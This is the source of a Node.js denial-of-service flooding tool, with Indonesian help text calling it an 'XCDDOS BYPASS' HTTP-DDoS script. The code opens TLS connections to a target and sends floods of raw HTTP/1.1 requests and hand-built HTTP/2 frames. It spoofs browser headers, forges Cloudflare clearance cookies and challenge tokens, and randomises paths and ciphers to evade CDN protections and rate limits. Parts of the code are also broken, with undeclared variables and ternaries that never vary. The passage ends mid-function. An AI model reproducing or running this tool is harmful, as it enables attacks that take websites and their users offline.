const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const axios = require('axios');
const { exec } = require('child_process');
const https = require('https');
const http2 = require('http2-wrapper');

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--cdn', value: get_option('--cdn') },
    { flag: '--uam', value: get_option('--uam') },
    { flag: '--precheck', value: get_option('--precheck') },
    { flag: '--randpath', value: get_option('--randpath') }
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }

    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    return false;
}

const docss = `
</XCDDOS BYPASS OPTIONS SPECIAL 0% HTTP-DDOS>

1. <GET/POST>: Menentukan jenis metode HTTP yang akan digunakan, apakah GET atau POST. Contoh: <GET> atau <POST>.

2. <target>: Menentukan URL atau target yang akan diserang. Contoh: https://example.com.

3. <time>: Menentukan durasi atau waktu dalam detik untuk menjalankan serangan. Contoh: 60 (untuk serangan selama 60 detik).

4. <threads>: Menentukan jumlah thread atau koneksi simultan yang akan dibuat. Contoh: 50.

5. <ratelimit>: Menetapkan batas laju permintaan, jika ada. Contoh: 1000 (batas 1000 permintaan per detik).

6. <proxy>: Menentukan pengaturan proxy yang mungkin diperlukan. Contoh: http://proxy.example.com:8080.

7. --query 1/2/3/4/5/6/7/8/9/10: Parameter opsional untuk menentukan jenis permintaan atau kueri tertentu. Contoh: --query 3.

8. --delay <1-100>: Parameter opsional untuk menentukan jeda antara permintaan dalam milidetik. Contoh: --delay 50.

9. --cookies=key: Parameter opsional untuk menentukan cookie yang akan disertakan dalam permintaan. Contoh: --cookie sessionID=abc123.

10. --precheck true/false: Parameter opsional untuk mengaktifkan mode pemeriksaan berkala pada target. Contoh: --precheck true.

11. --bfm true/false: Parameter opsional untuk mengaktifkan atau menonaktifkan botfightmode. Contoh: --bfm true.

12. --httpver "h2": Parameter opsional untuk memilih versi ALPN. Contoh: --httpver "h2, http/1.1, h1".

13. --referer %RAND% / https://target.com: Parameter opsional untuk menentukan header referer. Contoh: --referer https://example.com.

14. --postdata "user=f&pass=f": Parameter opsional untuk menyertakan data dalam permintaan POST. Contoh: --postdata "username=admin&password=123".

15. --ua "user-agent": Parameter opsional untuk menentukan header User-Agent. Contoh: --ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/58.0.3029.110 Safari/537.3".

16. --secua "sec-ch-ua": Parameter opsional untuk menentukan header Sec-CH-UA. Contoh: --secua "Chromium;v=88, Firefox;v=85, Not A;Brand;v=99".

17. --header "user-ganet@kontol#referer@https://super.wow": Parameter opsional untuk menentukan header kustom. Contoh: --header "user-ganet@kontol#referer@https://super.wow".

18. --ratelimit true/false: Parameter opsional untuk mengaktifkan mode ratelimit dan melewati batasan. Contoh: --ratelimit true/false.

19. --randpath true/false: Parameter opsional untuk mengaktifkan mode jalur acak. Contoh: --randpath true/false.

20. --randrate true/false: Parameter opsional untuk mengaktifkan mode laju acak. Contoh: --randrate true/false.

21. --debug true/false: Parameter opsional untuk menampilkan kesalahan atau output dari skrip ini. Contoh: --debug true.

22. type Random string:
%RAND% (string & angka acak panjang 6)
%RANDLN% (string & angka acak panjang 15)
%RANDTN% (token acak panjang 20)
%RANDL% (string acak panjang 20)
%RANDN% (angka acak panjang 20)
Fungsi ini hanya tersedia dalam jalur. Contoh: https://example.com/%RAND%.

23. --cdn true/false: Untuk melewati CDN atau layanan statis seperti Firebase, NamecheapCDN. Contoh: --cdn true.

24. --full: Dapat memberikan dampak yang sangat besar dengan Amazon, Namecheap, NASA, CIA, dll. [buffer 10k].

25. --legit: Memberikan header tambahan dan bypass tingkat tinggi, tetapi berisiko terdeteksi sebagai BAD SOURCE. Header akan diacak untuk setiap permintaan.


Usage: node HDD.js GET target time 40 200 --bfm true --debug true --legit true --ratelimit true --delay 10
`;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxy = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const cdnindex = process.argv.indexOf('--cdn');
const cdn = cdnindex !== -1 && cdnindex + 1 < process.argv.length ? process.argv[cdnindex + 1] : undefined;

const customIPindex = process.argv.indexOf('--ip');
const customIP = customIPindex !== -1 && customIPindex + 1 < process.argv.length ? process.argv[customIPindex + 1] : undefined;

const customUAindex = process.argv.indexOf('--useragent');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--httpver');
const useLegitHeaders = process.argv.includes('--legit');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const docs = process.argv.indexOf('--show');
const docsvalue = docs !== -1 && docs + 1 < process.argv.length ? process.argv[docs + 1] : undefined;


if (docsvalue) {
if (docsvalue.includes('docs')) {
    console.clear();
    console.log(docss);
    process.exit(1);
}
}

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxy) {
    console.clear();
    console.error(`node ${process.argv[1]} --show docs`);
    process.exit(1);
}

let hcookie = '';

const url = new URL(target)

if (isNaN(time) || time <= 0) {
    console.error('Error invalid time format')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads format')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0) {
    console.error(`Error ratelimit format`)
    process.exit(1);
}

 if (enabled('uam')) {
    ucookie = `cf_clearance`;
}

 if (enabled('cdn')) {
    const requestHeaders = {
        'Accept': 'text/html',
        'Accept-Language': 'en-US,en;q=0.5',
    };
    const buffer = Buffer.alloc(1024);
    const performRequest = async () => {
        try {
            await axios({
                method: POST,
                url: url,
                headers: requestHeaders,
                responseType: 'arraybuffer',
                maxRedirects: 0,
                timeout: 10000,
            });
        } catch (error) {
            console.error(`Request failed: ${error.message}`);  // Fixed here
        }
    };
    const startFlood = async () => {
        const end = performance.now() + time * 1000;
        const interval = 1000 / ratelimit;
        while (performance.now() < end) {
            for (let i = 0; i < threads; i++) {
                setTimeout(() => {
                    performRequest();
                }, interval * i);
            }
            await new Promise(resolve => setTimeout(resolve, interval));
        }
    };
    startFlood();
}

const agentbokep = new https.Agent({
    rejectUnauthorized: false
});

 if (enabled('precheck')) {
    const timeoutPromise = new Promise((resolve, reject) => {
       setTimeout(() => {
          reject(new Error('Request timed out'));
      }, 5000);
   });
  const axiosPromise = axios.get(target, {
      httpsAgent: agentbokep,
      headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        }
  });
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      console.clear();
      const { status, data } = response;
      console.log(`> Precheck: ${status}`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.clear();
        console.log(`> Precheck: Request Timed Out`);
      } else if (error.response) {
        console.clear();
        console.log(`> Precheck: ${error.response.status}`);
      } else {
        console.clear();
        console.log(`> Precheck: ${getCurrentTime()} ${error.message}`);
      }
    });
}

const randpathEnabled = enabled('randpath');
const timestampString1 = timestamp.toString().substring(0, 10);
const pathValue = randpathEnabled
  ? (Math.random() < 1 / 100000
      ? `${url.pathname}?__cf_chl_rt_tk=${randstrr(30)}_${randstrr(12)}-${timestampString}-0-gaNy${randstrr(8)}`
      : `${url.pathname}?${generateRandomString(6, 7)}&${generateRandomString(6, 7)}`
    )
  : target.path;


function generateClearanceToken() {
const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._";
let token = "";

// Tambahkan karakter acak (sekitar 150-200 karakter)  
for (let i = 0; i < 180; i++) {  
    token += chars[Math.floor(Math.random() * chars.length)];  
}  

// Tambahkan timestamp Unix saat ini  
const timestamp = Math.floor(Date.now() / 1000); // Epoch time dalam detik  

// Gabungkan dengan format token  
return `${ememmmmmemmeme(4, 4)}${token}-${timestamp}-1.2.1.1-${randomString(40)}`;

}

function randomString(length) {
const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}


if (cookieValue) { ucookie
    if (cookieValue === '%RAND%') {
        hcookie = `cf_clearance=${generateClearanceToken()}`;
    } else {
        hcookie = `cf_clearance=${generateClearanceToken()}`;
    }
}


function getRandomUserAgent() {
   const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
   const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
   const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES', 'id-ID'];
   const countryList = ['US', 'GB', 'FR', 'DE', 'ES', 'ID'];
   const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
   const os = osList[Math.floor(Math.random() * osList.length)];
   const browser = browserList[Math.floor(Math.random() * browserList.length)];
   const language = languageList[Math.floor(Math.random() * languageList.length)];
   const country = countryList[Math.floor(Math.random() * countryList.length)];
   const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
   const version = Math.floor(Math.random() * 100) + 1;
   const randomOrder = Math.floor(Math.random() * 6) + 1;
   const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
   const encryptedString = btoa(userAgentString);
   let finalString = '';
   for (let i = 0; i < encryptedString.length; i++) {
     if (i % randomOrder === 0) {
       finalString += encryptedString.charAt(i);
     } else {
       finalString += encryptedString.charAt(i).toUpperCase();
     }
   }
   return finalString;
 }

const browserNames = Array.from({ length: 100 }, (_, i) => `Browser${i + 1}`);
const browserVersions = Array.from({ length: 100 }, (_, i) => `${i + 1}.0`);
const operatingSystems = ["Linux", "Windows", "macOS", "Android", "iOS", "FreeBSD", "OpenBSD", "NetBSD", "Solaris", "AIX", "QNX", "Haiku", "ReactOS", "ChromeOS", "AmigaOS", "BeOS", "MorphOS", "OS/2", "Minix", "Unix", "IRIX", "Kocak", "LOL", "test"];
const deviceNames = Array.from({ length: 100 }, (_, i) => `Device${i + 1}`);
const renderingEngines = Array.from({ length: 80 }, (_, i) => `Engine${i + 1}`);
const engineVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
const customFeatures = Array.from({ length: 50 }, (_, i) => `Feature${i + 1}`);
const featureVersions = Array.from({ length: 80 }, (_, i) => `${i + 1}.0`);
const cplist = [
"ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
"ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES" ];
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
function generateUserAgent() {
    return `${getRandomElement(browserNames)}/${getRandomElement(browserVersions)} (${getRandomElement(deviceNames)}; ${getRandomElement(operatingSystems)}) ${getRandomElement(renderingEngines)}/${getRandomElement(engineVersions)} (KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ememmmmmemmeme(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}



function buildRequest() {
    const browserVersion = getRandomInt(120, 123);

    const fwfw = ['Google Chrome', 'Brave', 'Yandex'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    let brandValue;
    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    }
    else if (browserVersion === 124) {
        brandValue = `"Mozilla/5.0 (Windows NT 10.0";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    }
    else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 132) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' 
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' 
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' 
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';

    const langValue = isBrave
        ? 'en-US,en;q=0.6'
        : 'en-US,en;q=0.7'
        ? 'en-US,en;q=0.8'
        : 'id-ID,id;q=0.9';
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: cross-site\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: `+generateUserAgent()+`\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    //console.log(headers.toString());
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    console.log('Connecting to', url.hostname, 'port 443');
    let tlsSocket;

    const netSocket = net.connect(443, url.hostname, () => {
        console.log('TCP connected, starting TLS handshake');
        tlsSocket = tls.connect({
            socket: netSocket,
            ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
            servername: url.hostname,
            ciphers: cipper,
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
            secure: true,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            rejectUnauthorized: false
        }, () => {
            console.log('TLS handshake done, sending requests');

            if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
                if (forceHttp == 2) {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }

                function doWriteHttp1() {
                    sleep(49);
                    tlsSocket.write(http1Payload, (err) => {
                        if (!err) {
                            setTimeout(() => {
                                sleep(1);
                                doWriteHttp1();
                            }, isFull ? 1000 : 1000 / ratelimit);
                        } else {
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    });
                }
                sleep(19);
                doWriteHttp1();

                tlsSocket.on('error', () => {
                    tlsSocket.end(() => tlsSocket.destroy());
                });
                return;
            }

            if (forceHttp == 1) {
                tlsSocket.end(() => tlsSocket.destroy());
                return;
            }

            let streamId = 1;
            let data = Buffer.alloc(0);
            let hpack = new HPACK();
            hpack.setTableSize(4096);

            const updateWindow = Buffer.alloc(4);
            updateWindow.writeUInt32BE(custom_update, 0);

            const frames = [
                Buffer.from(PREFACE, 'binary'),
                encodeFrame(0, 4, encodeSettings([
                    [1, custom_header],
                    [2, 0],
                    [4, custom_window],
                    [6, custom_table]
                ])),
                encodeFrame(0, 8, updateWindow)
            ];

            tlsSocket.on('data', (eventData) => {
                data = Buffer.concat([data, eventData]);

                while (data.length >= 9) {
                    const frame = decodeFrame(data);
                    if (frame != null) {
                        data = data.subarray(frame.length + 9);

                        if (frame.type === 4 && frame.flags === 0) {
                            tlsSocket.write(encodeFrame(0, 4, "", 1));
                        }

                        if (frame.type === 1 && debugMode) {
                            const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                            if (!statuses[status]) statuses[status] = 0;
                            statuses[status]++;
                        }

                        if (frame.type === 7 || frame.type === 5) {
                            if (frame.type === 7) {
                                if (debugMode) {
                                    if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
                                    statuses["GOAWAY"]++;
                                    console.log('Received GOAWAY frame, closing connection');
                                }
                            }
                            try {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                            } catch (e) {
                                if (debugMode) console.error('Error sending RST_STREAM:', e.message);
                            }
                            tlsSocket.end(() => tlsSocket.destroy());
                            return;
                        }
                    } else {
                        break;
                    }
                }
            });

            tlsSocket.write(Buffer.concat(frames));

            let requestCount = 0;

            function doWrite() {
                if (tlsSocket.destroyed) return;

                const requests = [];
                const customHeadersArray = [];

                if (customHeaders) {
                    const customHeadersList = customHeaders.split('#');
                    for (const header of customHeadersList) {
                        const [name, value] = header.split(':');
                        if (name && value) {
                            customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                        }
                    }
                }

                let ratelimitValue = (randrate !== undefined) ? getRandomInt(1, 90) : parseInt(ratelimit);

                for (let i = 0; i < (isFull ? ratelimitValue : 1); i++) {
                    if(requestCount >= 5) break;

                    const browserVersion = getRandomInt(120, 123);
                    const fwfw = ['Google Chrome', 'Brave'];
                    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                    const ref = ["same-site", "same-origin", "cross-site"];
                    const ref1 = ref[Math.floor(Math.random() * ref.length)];

                    let brandValue;
                    if (browserVersion === 120) {
                        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
                    } else if (browserVersion === 121) {
                        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
                    } else if (browserVersion === 122) {
                        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
                    } else if (browserVersion === 132) {
                        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
                    }

                    const isBrave = wfwf === 'Brave';

                    const acceptHeaderValue = isBrave
                        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
                        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
                        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
                        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';

                    const langValue = isBrave
                        ? 'en-US,en;q=0.7'
                        : 'en-US,en;q=0.8'
                        ? 'en-US,en;q=0.9'
                        : 'id-ID,id;q=0.9';

                    const secGpcValue = isBrave ? "1" : undefined;
                    const secChUaModel = isBrave ? '""' : undefined;
                    const secChUaPlatform = isBrave ? 'Windows' : undefined;
                    const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                    const secChUaMobile = isBrave ? '?0' : undefined;

                    const secChUa = `${brandValue}`;
                    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

                    function handleQuery(query) {
                        if (query === '1') {
                            return url.pathname + '?__cf_chl_rt_tk=' + randstrr(41) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                        } else if (query === '2') {
                            return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                        } else if (query === '3') {
                            return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                        } else {
                            return url.pathname;
                        }
                    }

                    const headers = Object.entries({
                        ":method": reqmethod,
                        ":authority": url.hostname,
                        ":scheme": "https",
                        ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                    }).concat(Object.entries({
                        ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                        ...(reqmethod === "POST" && { "content-length": "0" }),
                        "sec-ch-ua": secChUa,
                        "sec-ch-ua-mobile": "?0",
